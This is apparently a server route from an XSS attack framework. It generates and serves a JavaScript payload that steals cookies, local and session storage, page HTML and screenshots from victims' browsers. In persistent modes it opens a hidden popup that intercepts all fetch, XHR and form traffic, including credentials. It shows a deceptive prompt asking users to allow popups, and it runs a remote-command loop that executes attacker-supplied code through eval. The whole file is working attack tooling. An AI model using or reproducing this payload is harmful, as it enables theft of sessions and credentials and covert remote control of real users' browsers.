import { NextRequest, NextResponse } from 'next/server';
import { queryOne, Setting } from '@/lib/db';

// CORS headers - allow everything
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH',
  'Access-Control-Allow-Headers': '*',
  'Access-Control-Allow-Private-Network': 'true',
  'Access-Control-Max-Age': '86400',
};

async function getSetting(key: string, defaultValue: string): Promise<string> {
  try {
    const setting = await queryOne<Setting>(
      'SELECT value FROM settings WHERE key = $1',
      [key]
    );
    return setting?.value || defaultValue;
  } catch {
    return defaultValue;
  }
}

// Handle CORS preflight
export async function OPTIONS(request: NextRequest) {
  const headers: Record<string, string> = { ...corsHeaders };
  if (request.headers.get('Access-Control-Request-Private-Network')) {
    headers['Access-Control-Allow-Private-Network'] = 'true';
  }
  return new NextResponse(null, { status: 204, headers });
}

// AES-256-CBC encryption/decryption functions for payload (minified)
// Note: Web Crypto API only works in secure contexts (HTTPS or localhost)
// Payload will auto-fallback to unencrypted mode on HTTP targets
function getAesPayloadCode(key: string): string {
  // Key is 64 hex chars (32 bytes = 256 bits)
  // _cs = crypto.subtle available flag
  return `
var _k="${key}";var _cs=!!(window.crypto&&window.crypto.subtle);
function _h2b(h){for(var b=[],i=0;i<h.length;i+=2)b.push(parseInt(h.substr(i,2),16));return new Uint8Array(b)}
function _b2h(b){return Array.from(b).map(function(x){return x.toString(16).padStart(2,'0')}).join('')}
async function _enc(t){if(!_cs)return null;var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['encrypt']);var iv=crypto.getRandomValues(new Uint8Array(16));var e=await crypto.subtle.encrypt({name:'AES-CBC',iv:iv},k,new TextEncoder().encode(t));return _b2h(iv)+_b2h(new Uint8Array(e))}
async function _dec(c){if(!_cs)return null;try{var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['decrypt']);var iv=_h2b(c.substring(0,32));var d=_h2b(c.substring(32));var p=await crypto.subtle.decrypt({name:'AES-CBC',iv:iv},k,d);return new TextDecoder().decode(p)}catch(e){return null}}
`.replace(/\n/g, '');
}

export async function GET(request: NextRequest) {
  const baseUrl = process.env.NEXT_PUBLIC_APP_URL || `http://${request.headers.get('host')}`;
  const cb = `${baseUrl}/api/callback`;
  const ps = `${baseUrl}/api/persist`;
  const tf = `${baseUrl}/api/traffic`;

  const screenshotEnabled = await getSetting('screenshot_enabled', 'true') === 'true';
  const persistentEnabled = await getSetting('persistent_enabled', 'false') === 'true';
  const advancedPersistentEnabled = await getSetting('advanced_persistent_enabled', 'false') === 'true';
  const persistentKey = await getSetting('persistent_key', '');

  // Build payload  
  let js = `(function(){if(window.__n)return;window.__n=1;`;

  // Data collection
  js += `var d={uri:location.href,origin:location.hostname,referer:document.referrer,"user-agent":navigator.userAgent,cookies:document.cookie,timestamp:new Date().toISOString(),screenWidth:screen.width,screenHeight:screen.height};`;
  js += `try{var l={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(k)}d.localstorage=JSON.stringify(l)}catch(e){}`;
  js += `try{var s={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k)}d.sessionstorage=JSON.stringify(s)}catch(e){}`;
  js += `try{d.dom=document.documentElement.outerHTML;if(d.dom.length>5000000)d.dom=d.dom.substring(0,5000000)}catch(e){d.dom="[DOM capture failed: "+e.message+"]"}`;

  // Send function - FIXED: onload inside send()
  js += `function send(){var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
  js += `x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.id){window.__rid=r.id;`;

  // Initialize advanced persistent after we have report ID
  if (persistentEnabled && advancedPersistentEnabled) {
    js += `setTimeout(function(){initAdvanced()},100);`;
  }

  js += `}}catch(e){}};`;
  js += `x.send(JSON.stringify(d))}`;

  if (screenshotEnabled) {
    js += `var sc=document.createElement("script");sc.src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";`;
    js += `sc.onload=function(){try{html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true,scale:1,width:Math.min(document.documentElement.scrollWidth,1920),height:Math.min(document.documentElement.scrollHeight,4000)}).then(function(c){d.screenshot=c.toDataURL("image/jpeg",0.8);send()}).catch(function(e){d.screenshot_error="html2canvas: "+e.message;send()})}catch(e){d.screenshot_error="html2canvas exception: "+e.message;send()}};`;
    js += `sc.onerror=function(){d.screenshot_error="Failed to load html2canvas from CDN";send()};`;
    js += `setTimeout(function(){if(!d.screenshot&&!d.screenshot_error){d.screenshot_error="html2canvas timeout";send()}},10000);`;
    js += `document.head.appendChild(sc);`;
  } else {
    js += `send();`;
  }

  // Advanced Persistent Mode - Popup controller with traffic interception
  // Uses Base64 encoding to avoid escaping issues in document.write()
  if (persistentEnabled && advancedPersistentEnabled) {
    // Popup script code - will be base64 encoded
    // Combined request+response in single entry for efficiency
    const popupCode = `
var main=window.opener;
var rid=main.__rid;
var tf="${tf}";
var ps="${ps}";
var nxs="${baseUrl}";
function isNx(u){if(!u)return false;try{return u.indexOf(nxs)===0||u.indexOf("/api/")===0}catch(e){return false}}
function rpt(t,m,u,reqH,reqB,resH,resB,s){
  if(isNx(u))return;
  try{var x=new XMLHttpRequest();x.open("POST",tf,true);x.setRequestHeader("Content-Type","application/json");
  x.send(JSON.stringify({rid:rid,type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s}))}catch(e){}
}
function sstat(s){try{var x=new XMLHttpRequest();x.open("POST",ps,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:rid,status:s}))}catch(e){}}
function getBrowserHeaders(w,url){
  var s="";
  try{
    var loc=new URL(url,w.location.href);
    s+="Host: "+loc.host+"\\r\\n";
  }catch(e){}
  s+="User-Agent: "+w.navigator.userAgent+"\\r\\n";
  s+="Accept: */*\\r\\n";
  s+="Accept-Language: "+(w.navigator.languages?w.navigator.languages.join(", "):w.navigator.language)+"\\r\\n";
  s+="Accept-Encoding: gzip, deflate\\r\\n";
  if(w.document.referrer)s+="Referer: "+w.document.referrer+"\\r\\n";
  s+="Connection: keep-alive\\r\\n";
  if(w.navigator.doNotTrack==="1")s+="DNT: 1\\r\\n";
  return s;
}
function buildReqHeaders(w,url,customH,ck){
  var s=getBrowserHeaders(w,url);
  for(var k in customH){s+=k+": "+customH[k]+"\\r\\n"}
  if(ck)s+="Cookie: "+ck+"\\r\\n";
  return s;
}
function injectHooks(w){
  if(!w||w.__xh)return;w.__xh=1;
  var of=w.fetch;
  w.fetch=function(){
    var a=arguments;var u=a[0];var o=a[1]||{};
    var url=typeof u==="string"?u:(u&&u.url?u.url:"");
    if(isNx(url))return of.apply(w,a);
    var hdrs={};try{if(o.headers){if(typeof o.headers.forEach==="function"){o.headers.forEach(function(v,k){hdrs[k]=v})}else{for(var k in o.headers){hdrs[k]=o.headers[k]}}}}catch(e){}
    var ck="";try{ck=w.document.cookie||""}catch(e){}
    var rawReqH=buildReqHeaders(w,url,hdrs,ck);
    var reqBody=o.body?String(o.body).substring(0,10000):null;
    return of.apply(w,a).then(function(r){
      var resH="";try{r.headers.forEach(function(v,k){resH+=k+": "+v+"\\r\\n"})}catch(e){}
      try{var rc=r.clone();rc.text().then(function(t){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,t.substring(0,10000),r.status)}).catch(function(){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,null,r.status)})}catch(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,null,r.status)}
      return r
    }).catch(function(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,null,null,0);throw e})
  };
  var OX=w.XMLHttpRequest;
  w.XMLHttpRequest=function(){
    var x=new OX();var m="GET",u="",rh={},reqBody=null,rawReqH="";
    var oo=x.open;x.open=function(mt,ur){m=mt;u=ur;return oo.apply(x,arguments)};
    var osh=x.setRequestHeader;x.setRequestHeader=function(k,v){rh[k]=v;return osh.apply(x,arguments)};
    var os=x.send;x.send=function(b){
      if(isNx(u))return os.apply(x,arguments);
      var ck="";try{ck=w.document.cookie||""}catch(e){}
      rawReqH=buildReqHeaders(w,u,rh,ck);
      reqBody=b?String(b).substring(0,10000):null;
      x.addEventListener("load",function(){
        var resH=x.getAllResponseHeaders()||"";
        rpt("xhr",m,u,rawReqH,reqBody,resH,x.responseText?x.responseText.substring(0,10000):null,x.status)
      });
      x.addEventListener("error",function(){
        rpt("xhr",m,u,rawReqH,reqBody,null,null,0)
      });
      return os.apply(x,arguments)
    };
    return x
  };
  try{w.document.addEventListener("submit",function(e){
    var f=e.target;if(!f||f.tagName!=="FORM")return;
    try{var fd=new FormData(f);var data={};fd.forEach(function(v,k){data[k]=v});
    var action=f.action||w.location.href;
    if(isNx(action))return;
    var ck="";try{ck=w.document.cookie||""}catch(e){}
    var rawH=buildReqHeaders(w,action,{"Content-Type":"application/x-www-form-urlencoded"},ck);
    rpt("form",f.method?f.method.toUpperCase():"POST",action,rawH,JSON.stringify(data),null,null,null)}catch(e){}
  },true)}catch(e){}
}
var terminated=false;
setInterval(function(){
  try{
    if(!main||main.closed){if(!terminated){terminated=true;sstat("terminated")}self.close();return}
    if(!main.__xh){injectHooks(main)}
    if(main.location.href!==window.__lastUrl){
      window.__lastUrl=main.location.href;
      var ck="";try{ck=main.document.cookie||""}catch(e){}
      var rawH=getBrowserHeaders(main,main.location.href);
      if(ck)rawH+="Cookie: "+ck+"\\r\\n";
      rpt("navigation","GET",main.location.href,rawH,null,null,null,null)
    }
  }catch(e){}
},2000);
injectHooks(main);
sstat("popup_active");
`.trim();

    // Base64 encode the popup code
    const popupB64 = Buffer.from(popupCode).toString('base64');

    js += `
var _nxs="${baseUrl}";
var _ps="${ps}";
var _tf="${tf}";
function _isNx(u){if(!u)return false;try{return u.indexOf(_nxs)===0||u.indexOf("/api/")===0}catch(e){return false}}
function _sstat(s){try{var x=new XMLHttpRequest();x.open("POST",_ps,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,status:s}))}catch(e){}}
function _showPopupPrompt(){
  if(document.getElementById("_xpop"))return;
  var d=document.createElement("div");d.id="_xpop";
  d.innerHTML='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.75);z-index:999999;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif"><style>@keyframes _xbounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}@keyframes _xfade{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}@keyframes _xglow{0%,100%{filter:drop-shadow(0 0 8px #ff6b6b)}50%{filter:drop-shadow(0 0 20px #ff6b6b)}}</style><div style="position:fixed;top:10px;right:300px;text-align:center;animation:_xbounce 1s ease-in-out infinite"><svg style="animation:_xglow 1.5s ease-in-out infinite" width="80" height="100" viewBox="0 0 80 100"><defs><marker id="_xarr" markerWidth="10" markerHeight="10" refX="5" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 L2,5 Z" fill="#ff6b6b"/></marker></defs><path d="M40,90 L40,20" stroke="#ff6b6b" stroke-width="4" fill="none" stroke-linecap="round" marker-end="url(#_xarr)"/></svg></div><div style="position:fixed;top:115px;right:120px;color:#fff;font-size:16px;font-weight:700;text-shadow:0 2px 10px rgba(0,0,0,0.5);animation:_xfade 0.4s ease;background:linear-gradient(135deg,#ff6b6b,#ee5a5a);padding:12px 20px;border-radius:30px;box-shadow:0 8px 30px rgba(255,107,107,0.4)">👆 Click here to allow pop-ups!</div><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;animation:_xfade 0.5s ease"><div style="background:#fff;border-radius:16px;padding:28px 40px;box-shadow:0 25px 80px rgba(0,0,0,0.5);max-width:450px"><div style="font-size:48px;margin-bottom:16px">🔒</div><h3 style="margin:0 0 12px;font-size:22px;font-weight:700;color:#1a1a2e">Pop-ups Blocked</h3><p style="margin:0 0 24px;font-size:15px;color:#555;line-height:1.7">This website requires pop-ups. Look for the <strong>blocked pop-up icon</strong> in your address bar and click <strong>Always allow</strong>.</p><button onclick="document.getElementById(\\\'_xpop\\\').remove()" style="background:linear-gradient(135deg,#6366f1 0%,#8b5cf6 100%);color:#fff;border:none;padding:14px 40px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 4px 15px rgba(99,102,241,0.3)">Got it!</button></div></div></div>';
  document.body.appendChild(d);
}
function _getBrowserHeaders(w,url){
  var s="",crlf=String.fromCharCode(13,10);
  try{var loc=new URL(url,w.location.href);s+="Host: "+loc.host+crlf}catch(e){}
  s+="User-Agent: "+w.navigator.userAgent+crlf;
  s+="Accept: */*"+crlf;
  s+="Accept-Language: "+(w.navigator.languages?w.navigator.languages.join(", "):w.navigator.language)+crlf;
  s+="Accept-Encoding: gzip, deflate"+crlf;
  if(w.document.referrer)s+="Referer: "+w.document.referrer+crlf;
  s+="Connection: keep-alive"+crlf;
  if(w.navigator.doNotTrack==="1")s+="DNT: 1"+crlf;
  return s;
}
function _buildReqHeaders(w,url,customH,ck){
  var s=_getBrowserHeaders(w,url),crlf=String.fromCharCode(13,10);
  for(var k in customH){s+=k+": "+customH[k]+crlf}
  if(ck)s+="Cookie: "+ck+crlf;
  return s;
}
function rpt(t,m,u,reqH,reqB,resH,resB,s){
  if(_isNx(u))return;
  try{var x=new XMLHttpRequest();x.open("POST",_tf,true);x.setRequestHeader("Content-Type","application/json");
  x.send(JSON.stringify({rid:window.__rid,type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s}))}catch(e){}
}
function injectHooks(w){
  if(!w||w.__xh)return;w.__xh=1;
  var of=w.fetch;
  w.fetch=function(){
    var a=arguments;var u=a[0];var o=a[1]||{};
    var url=typeof u==="string"?u:(u&&u.url?u.url:"");
    if(_isNx(url))return of.apply(w,a);
    var hdrs={};try{if(o.headers){if(typeof o.headers.forEach==="function"){o.headers.forEach(function(v,k){hdrs[k]=v})}else{for(var k in o.headers){hdrs[k]=o.headers[k]}}}}catch(e){}
    var ck="";try{ck=w.document.cookie||""}catch(e){}
    var rawReqH=_buildReqHeaders(w,url,hdrs,ck);
    var reqBody=o.body?String(o.body).substring(0,10000):null;
    return of.apply(w,a).then(function(r){
      var resH="",crlf=String.fromCharCode(13,10);try{r.headers.forEach(function(v,k){resH+=k+": "+v+crlf})}catch(e){}
      try{var rc=r.clone();rc.text().then(function(t){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,t.substring(0,10000),r.status)}).catch(function(){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,null,r.status)})}catch(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,null,r.status)}
      return r
    }).catch(function(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,null,null,0);throw e})
  };
  var OX=w.XMLHttpRequest;
  w.XMLHttpRequest=function(){
    var x=new OX();var m="GET",u="",rh={},reqBody=null,rawReqH="";
    var oo=x.open;x.open=function(mt,ur){m=mt;u=ur;return oo.apply(x,arguments)};
    var osh=x.setRequestHeader;x.setRequestHeader=function(k,v){rh[k]=v;return osh.apply(x,arguments)};
    var os=x.send;x.send=function(b){
      if(_isNx(u))return os.apply(x,arguments);
      var ck="";try{ck=w.document.cookie||""}catch(e){}
      rawReqH=_buildReqHeaders(w,u,rh,ck);
      reqBody=b?String(b).substring(0,10000):null;
      x.addEventListener("load",function(){
        var resH=x.getAllResponseHeaders()||"";
        rpt("xhr",m,u,rawReqH,reqBody,resH,x.responseText?x.responseText.substring(0,10000):null,x.status)
      });
      x.addEventListener("error",function(){
        rpt("xhr",m,u,rawReqH,reqBody,null,null,0)
      });
      return os.apply(x,arguments)
    };
    return x
  };
  try{w.document.addEventListener("submit",function(e){
    var f=e.target;if(!f||f.tagName!=="FORM")return;
    try{var fd=new FormData(f);var data={};fd.forEach(function(v,k){data[k]=v});
    var action=f.action||w.location.href;
    if(_isNx(action))return;
    var ck="";try{ck=w.document.cookie||""}catch(e){}
    var rawH=_buildReqHeaders(w,action,{"Content-Type":"application/x-www-form-urlencoded"},ck);
    rpt("form",f.method?f.method.toUpperCase():"POST",action,rawH,JSON.stringify(data),null,null,null)}catch(e){}
  },true)}catch(e){}
}
function initAdvanced(){
  var popup=null,code=atob("${popupB64}"),html="<html><head></head><body><scr"+"ipt>"+code+"</scr"+"ipt></body></html>";
  function inject(p){try{p.document.open();p.document.write(html);p.document.close();return true}catch(e){try{var s=p.document.createElement("script");s.textContent=code;p.document.body.appendChild(s);return true}catch(e2){try{p.eval(code);return true}catch(e3){return false}}}}
  function ok(p){if(p&&!p.closed){if(inject(p)){window.__xctrl=p;try{p.moveTo(-9999,-9999);p.resizeTo(1,1)}catch(e){}return true}}return false}
  try{popup=window.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");if(ok(popup))return}catch(e){}
  try{var blob=new Blob([html],{type:"text/html"});popup=window.open(URL.createObjectURL(blob),"_xc","width=1,height=1,left=-9999,top=-9999");if(popup&&!popup.closed){window.__xctrl=popup;try{popup.moveTo(-9999,-9999);popup.resizeTo(1,1)}catch(e){}return}}catch(e){}
  try{var ifr=document.createElement("iframe");ifr.style.cssText="position:absolute;width:0;height:0;border:0;opacity:0;pointer-events:none";document.body.appendChild(ifr);popup=ifr.contentWindow.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");if(popup){var icode="window.opener=window.parent.opener||window.parent;"+code;try{popup.document.open();popup.document.write("<html><body><scr"+"ipt>"+icode+"</scr"+"ipt></body></html>");popup.document.close();window.__xctrl=popup;try{popup.moveTo(-9999,-9999);popup.resizeTo(1,1)}catch(e){}document.body.removeChild(ifr);return}catch(e){}}try{document.body.removeChild(ifr)}catch(e){}}catch(e){}
  try{var ifr2=document.createElement("iframe");ifr2.src="javascript:true";ifr2.style.cssText="position:absolute;width:0;height:0;border:0;opacity:0";document.body.appendChild(ifr2);setTimeout(function(){try{popup=ifr2.contentWindow.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");if(popup){var icode="window.opener=window.parent.opener||window.parent;"+code;popup.document.open();popup.document.write("<html><body><scr"+"ipt>"+icode+"</scr"+"ipt></body></html>");popup.document.close();window.__xctrl=popup;try{popup.moveTo(-9999,-9999);popup.resizeTo(1,1)}catch(e){}document.body.removeChild(ifr2);return}try{document.body.removeChild(ifr2)}catch(e){}}catch(e){try{document.body.removeChild(ifr2)}catch(e2){}}},10);if(window.__xctrl)return}catch(e){}
  setTimeout(function(){if(!window.__xctrl){_showPopupPrompt();injectHooks(window);_sstat("popup_blocked")}},600);
}
`.replace(/\n/g, '');
  }

  if (persistentEnabled) {
    const useEncryption = persistentKey && persistentKey.length === 64;

    if (useEncryption) {
      // Add AES functions
      js += getAesPayloadCode(persistentKey);

      // Encrypted poll loop with fallback for HTTP (no crypto.subtle)
      // Client sends {rid, nocrypto: true} if crypto.subtle is not available
      js += `(async function p(){setTimeout(async function(){if(!window.__rid){p();return}`;
      js += `var x=new XMLHttpRequest();x.open("POST","${ps}",true);x.setRequestHeader("Content-Type","application/json");`;
      js += `x.onload=async function(){try{var r=JSON.parse(x.responseText);`;
      // Check if we have crypto available
      js += `if(r.cmd){var cmd=_cs?await _dec(r.cmd):r.cmd;if(!cmd){p();return}`;
      // Execute command and capture result
      js += `var result;try{result=eval(cmd)}catch(e){result="Error: "+e.message}`;
      // Send result back - encrypt if crypto available
      js += `if(result!==undefined){var res=typeof result==="string"?result:JSON.stringify(result);var enc=_cs?await _enc(res):null;var rx=new XMLHttpRequest();rx.open("POST","${ps}",true);rx.setRequestHeader("Content-Type","application/json");rx.send(JSON.stringify({rid:window.__rid,response:enc||res,encrypted:!!enc}))}`;
      js += `}}catch(e){}p()};`;
      js += `x.onerror=function(){p()};x.send(JSON.stringify({rid:window.__rid,nocrypto:!_cs}))},3000)})();`;
    } else {
      // Unencrypted poll loop (legacy)
      js += `(function p(){setTimeout(function(){if(!window.__rid){p();return}`;
      js += `var x=new XMLHttpRequest();x.open("POST","${ps}",true);x.setRequestHeader("Content-Type","application/json");`;
      js += `x.onload=function(){try{var r=JSON.parse(x.responseText);`;
      js += `if(r.cmd){`;
      // Execute command and capture result
      js += `var result;try{result=eval(r.cmd)}catch(e){result="Error: "+e.message}`;
      // Send result back if there is one (not undefined and not a DOM alert/redirect)
      js += `if(result!==undefined){var rx=new XMLHttpRequest();rx.open("POST","${ps}",true);rx.setRequestHeader("Content-Type","application/json");rx.send(JSON.stringify({rid:window.__rid,response:typeof result==="string"?result:JSON.stringify(result)}))}}`;
      js += `}catch(e){}p()};`;
      js += `x.onerror=function(){p()};x.send(JSON.stringify({rid:window.__rid}))},3000)})();`;
    }
  }

  js += `})();`;

  return new NextResponse(js, {
    status: 200,
    headers: {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      ...corsHeaders,
    },
  });
}

